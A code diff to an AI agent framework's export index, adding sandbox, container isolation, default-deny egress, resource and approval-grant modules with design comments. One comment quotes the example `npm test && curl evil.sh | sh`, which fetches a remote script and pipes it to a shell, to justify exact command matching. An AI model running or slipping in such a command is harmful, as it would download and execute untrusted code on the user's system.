@@ -88,9 +88,54 @@ export { makeTools, toolDefinitions, validateArgs, ABSENT } from './agent/tools/
 // ── Workspace ───────────────────────────────────────────────────────────────
 // Path containment (including symlink escape) and bounded output. NOT OS-level isolation.
 export {
-  LocalSandbox, attachCheckpoints, scrubEnv,
+  LocalSandbox, SandboxError, attachCheckpoints, scrubEnv,
   MAX_OUTPUT_BYTES, MAX_ERROR_BYTES, GREP_MAX_HITS,
 } from './sandbox/local/index.mjs';
+
+// ── Execution environment (Wave 6) ──────────────────────────────────────────
+//
+// The backend seam. `LocalSandbox` is #1 and honestly declares `isolation: 'none'` — path
+// containment is a workspace scope, NOT OS isolation (plan §13). `ContainerSandbox` is #2 and is
+// a real boundary: its own process tree and network stack, with the workspace BIND-MOUNTED so the
+// ADR-011 witness and the git-shadow checkpoints keep working on the same bytes. That sharing is
+// the Q4 reconciliation, and it is why the crash matrix reaches identical decisions under both.
+export {
+  Isolation, ISOLATED_LEVELS, describeCapabilities, assertBackendContract,
+  REQUIRED_METHODS, REQUIRED_PROPERTIES,
+} from './sandbox/backend.mjs';
+export {
+  ContainerSandbox, detectRuntime, pruneOrionContainers, CONTAINER_WORKSPACE, DEFAULT_IMAGE,
+} from './sandbox/container/index.mjs';
+// Default-deny egress. `hardBlockReason` is exported because the rules it enforces — link-local
+// and cloud metadata — must hold in any policy a deployer writes, not just in this one.
+export { createNetworkPolicy, hardBlockReason, networkFlagsFor, HARD_BLOCKED }
+  from './sandbox/network.mjs';
+
+// Posture is DERIVED from the backend's declared capability, never configured (W6-G). Exported
+// so a deployer substituting the authorizer can reproduce the same derivation instead of
+// reinventing — and so the "an override may only RAISE strictness" rule travels with it.
+export { derivePosture, strictest, POSTURE_RANK } from './auth/posture.mjs';
+
+// ── Resources: identity and lifecycle (Wave 6, Recovery 2.0) ────────────────
+//
+// The current binding is a FOLD over `resource.*` events, exactly as a plan is a fold over
+// `plan.*` (plan §9.3). Deliberately NOT a mutable snapshot column: that is what the prior art
+// does, and it would make a replayed run reconstruct a different binding than the original.
+export {
+  resolveResource, releaseResource, Resolution,
+  resourceId, projectResources, bindingToReattach, ResourceKind, BindingState,
+} from './core/resource/index.mjs';
+export { summariseResources } from './core/projection/resource.mjs';
+
+// ── Grants: approval memory (Wave 6-M) ──────────────────────────────────────
+//
+// G answers whether an action CAN be auto-allowed; this answers whether it ALREADY WAS approved
+// and whether that still holds. Matching is a normalised EXACT command comparison, never a glob —
+// `npm *` would make `npm test && curl evil.sh | sh` a pre-approved command.
+export {
+  GrantScope, describeGrant, projectGrants, grantCovers, findGrant, summariseGrants,
+  normaliseCommand, projectKey, grantId,
+} from './core/projection/grant.mjs';
 
 // ── Authorization: the substitution seam ────────────────────────────────────
 // authorize(action, context) -> allow | deny | escalate.
